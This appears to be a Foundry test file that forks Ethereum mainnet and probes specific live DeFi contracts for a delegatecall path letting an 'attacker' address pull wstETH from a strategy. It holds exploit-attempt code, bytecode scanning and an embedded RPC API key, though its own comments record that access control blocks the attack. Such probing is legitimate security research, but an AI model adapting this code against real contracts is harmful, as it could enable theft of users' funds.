// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IStrategy {
    function vault() external view returns (address);
    function strategyStorage() external view returns (address);
    function callExecute(address _target, bytes memory _data) external payable returns (bytes32);
    function execute(address _target, bytes memory _data) external payable returns (bytes32);
}

interface IAction {
    function executeAction(bytes memory _callData, uint8[] memory _paramMapping, bytes32[] memory _returnValues) external payable returns (bytes32);
    function executeActionDirect(bytes memory _callData) external payable returns (bytes32);
}

contract TransferActionExploit is Test {
    // The action with transfer selector!
    address constant TRANSFER_ACTION = 0xc780112305ED959CEEeb0DE692E2407E4145Fc3A;

    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeTransferAction() public view {
        console.log("=== ANALYZING TRANSFER ACTION ===\n");
        console.log("Transfer Action:", TRANSFER_ACTION);

        bytes memory code = TRANSFER_ACTION.code;
        console.log("Code size:", code.length);

        // Find the transfer selector location
        console.log("\nSearching for transfer selector (0xa9059cbb)...");

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == bytes4(0xa9059cbb)) {
                console.log("Found at offset:", i);
                // Print surrounding bytes for context
                console.log("Context (offset-10 to offset+10):");
                uint256 start = i > 10 ? i - 10 : 0;
                uint256 end = i + 10 < code.length ? i + 10 : code.length;
                bytes memory context = new bytes(end - start);
                for (uint j = start; j < end; j++) {
                    context[j - start] = code[j];
                }
                console.logBytes(context);
            }
        }

        // Check for common function signatures this action might implement
        console.log("\nChecking action interface...");

        // Check actionType (DeFiSaver pattern: 0=FL, 1=STANDARD, 2=CUSTOM)
        (bool success, bytes memory data) = TRANSFER_ACTION.staticcall(
            abi.encodeWithSignature("actionType()")
        );
        if (success && data.length == 32) {
            uint8 actionType = abi.decode(data, (uint8));
            console.log("actionType:", actionType);
        }
    }

    function test_TryCallTransferAction() public {
        console.log("=== TRYING TO CALL TRANSFER ACTION ===\n");

        vm.startPrank(attacker);

        // First, let's see what happens if we call executeAction directly
        // (This won't work because it needs to be in delegatecall context)

        // Prepare params for a potential token transfer
        // Common param structure for SendToken: (address token, address to, uint256 amount)
        bytes memory params = abi.encode(
            wstETH,     // token
            attacker,   // to
            1e18        // amount
        );

        console.log("Calling executeAction directly...");
        try IAction(TRANSFER_ACTION).executeAction(params, new uint8[](0), new bytes32[](0)) {
            console.log("executeAction succeeded!");
        } catch Error(string memory reason) {
            console.log("executeAction failed:", reason);
        } catch (bytes memory data) {
            console.log("executeAction failed (raw)");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        // Try executeActionDirect
        console.log("\nCalling executeActionDirect...");
        try IAction(TRANSFER_ACTION).executeActionDirect(params) {
            console.log("executeActionDirect succeeded!");
        } catch Error(string memory reason) {
            console.log("executeActionDirect failed:", reason);
        } catch (bytes memory data) {
            console.log("executeActionDirect failed (raw)");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_SimulateDelegatecall() public {
        console.log("=== SIMULATING DELEGATECALL CONTEXT ===\n");

        // Deploy a test contract that simulates Strategy's delegatecall
        StrategySimulator sim = new StrategySimulator();

        // Give the simulator some tokens
        deal(wstETH, address(sim), 10e18);
        console.log("Simulator wstETH balance:", IERC20(wstETH).balanceOf(address(sim)) / 1e18);

        // Try to make it delegatecall the transfer action
        bytes memory params = abi.encode(
            wstETH,     // token
            attacker,   // to
            1e18        // amount
        );

        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH before:", attackerBefore);

        // This simulates what happens when Strategy delegatecalls to an action
        try sim.simulateDelegatecall(TRANSFER_ACTION, params) {
            console.log("Delegatecall succeeded!");
        } catch Error(string memory reason) {
            console.log("Delegatecall failed:", reason);
        } catch (bytes memory data) {
            console.log("Delegatecall failed (raw)");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH after:", attackerAfter);

        if (attackerAfter > attackerBefore) {
            console.log("CRITICAL: Attacker gained wstETH!");
        }
    }

    function test_IdentifyActionID() public view {
        console.log("=== IDENTIFYING ACTION ID ===\n");

        // The action ID is typically bytes4(keccak256("ActionName"))
        // Let's try to find what this action's ID might be

        // Check if this action is one of the registered ones
        // Known registered IDs:
        // 0x19713586 and 0x4f18b88c are the unknown ones

        console.log("Potential action IDs for TRANSFER_ACTION:");
        console.log("0x19713586 - checking...");

        // Try to decode what parameters this action expects
        // by calling it with various param structures

        // Common structures:
        // 1. (address token, address to, uint256 amount)
        // 2. (address to, uint256 amount) - if token is implicit
        // 3. (uint256 amount, address to) - alternative order
    }

    function test_CheckOtherTransferActions() public view {
        console.log("=== CHECKING OTHER POTENTIAL TRANSFER ACTIONS ===\n");

        // Check action 0x351dd4581d61BCE7101FDf5f6864D510021c7CaB as well
        address action12 = 0x351dd4581d61BCE7101FDf5f6864D510021c7CaB;

        bytes memory code = action12.code;
        console.log("Action 12 code size:", code.length);

        // Look for wstETH address in bytecode
        bool hasWstETH = false;
        for (uint j = 0; j + 20 < code.length; j++) {
            bytes20 addr;
            assembly {
                addr := mload(add(add(code, 32), j))
            }
            if (address(addr) == 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) {
                hasWstETH = true;
                break;
            }
        }
        console.log("Contains wstETH address:", hasWstETH);

        // Check what external calls it makes
        uint256 callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) callCount++;
        }
        console.log("CALL opcodes:", callCount);
    }

    function test_FullExploitAttempt() public {
        console.log("=== FULL EXPLOIT ATTEMPT ===\n");

        // The attack chain:
        // 1. We need to trigger Strategy to execute actions
        // 2. The actions run in Strategy's context (delegatecall)
        // 3. If an action does IERC20(token).transfer(to, amount)
        //    It transfers from Strategy (address(this) in delegatecall context)

        console.log("Current state:");
        console.log("  Strategy 0 aWstETH:", IERC20(aWstETH).balanceOf(STRATEGY_0) / 1e18);
        console.log("  Strategy 0 wstETH:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);
        console.log("  Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // The problem: We can't directly call Strategy.callExecute (requires strategyExecutor)
        // And we can't call strategyExecutor.executeOnStrategy (requires whitelisted executor)

        console.log("\nAccess control blocking points:");
        console.log("  1. Strategy.callExecute - requires strategyExecutor");
        console.log("  2. StrategyExecutor.executeOnStrategy - requires whitelist");
        console.log("  3. Both are onlyOwner to modify");

        // BUT: What if there's another entry point?
        // Check if Strategy has any other functions that delegatecall

        console.log("\nSearching for alternative entry points...");

        // Check Strategy's bytecode for DELEGATECALL patterns
        bytes memory stratCode = STRATEGY_0.code;
        uint256 delegatecallCount = 0;
        for (uint i = 0; i < stratCode.length; i++) {
            if (uint8(stratCode[i]) == 0xf4) delegatecallCount++;
        }
        console.log("Strategy DELEGATECALL opcodes:", delegatecallCount);
    }
}

contract StrategySimulator {
    function simulateDelegatecall(address target, bytes memory params) external {
        // Construct the executeAction call
        bytes memory callData = abi.encodeWithSignature(
            "executeAction(bytes,uint8[],bytes32[])",
            params,
            new uint8[](0),
            new bytes32[](0)
        );

        (bool success, bytes memory result) = target.delegatecall(callData);
        require(success, string(result));
    }

    // Implement vault() for VaultPull compatibility
    function vault() external view returns (address) {
        return 0x551d155760ae96050439AD24Ae98A96c765d761B;
    }

    receive() external payable {}
}
